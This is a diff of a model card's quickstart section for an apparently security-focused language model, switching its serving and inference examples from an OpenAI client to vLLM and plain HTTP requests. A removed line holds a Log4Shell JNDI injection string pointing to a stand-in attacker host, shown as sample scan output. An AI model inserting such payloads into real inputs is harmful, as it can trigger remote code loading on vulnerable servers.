@@ -31,46 +31,39 @@ Vext-labs-7B-v1.1 excels at four core security tasks:
 
 ## Quickstart
 
-### With vLLM (Recommended for Production)
+### Serving with vLLM
 
 ```bash
 pip install vllm
 
-python -m vllm.entrypoints.openai.api_server \
-    --model Vext-Labs-Inc/Vext-labs-7B-v1.1 \
-    --trust-remote-code
+vllm serve Vext-Labs-Inc/Vext-labs-7B-v1.1 --trust-remote-code --port 8000
 ```
 
-Then use the OpenAI-compatible API:
+### Inference
 
 ```python
-from openai import OpenAI
+import requests
 
-client = OpenAI(base_url="http://localhost:8000/v1", api_key="unused")
-
-response = client.chat.completions.create(
-    model="Vext-Labs-Inc/Vext-labs-7B-v1.1",
-    messages=[
+response = requests.post("http://localhost:8000/v1/chat/completions", json={
+    "model": "Vext-Labs-Inc/Vext-labs-7B-v1.1",
+    "messages": [
         {
             "role": "system",
             "content": "You are an autonomous security testing agent. Analyze tool output and decide next actions."
         },
         {
             "role": "user",
-            "content": """Nuclei scan results:
-[critical] CVE-2021-44228 Log4Shell detected at /api/login
-POC: ${jndi:ldap://attacker.com/a}
-
-What is this vulnerability and what should I do next?"""
+            "content": "Nuclei scan results:\n[critical] CVE-2021-44228 Log4Shell at /api/login\n\nWhat is this and what should I do next?"
         }
     ],
-    temperature=0.3,
-    max_tokens=512
-)
-print(response.choices[0].message.content)
+    "temperature": 0.3,
+    "max_tokens": 512
+})
+
+print(response.json()["choices"][0]["message"]["content"])
 ```
 
-### With Transformers
+### With Transformers (Local)
 
 ```python
 from transformers import AutoModelForCausalLM, AutoTokenizer
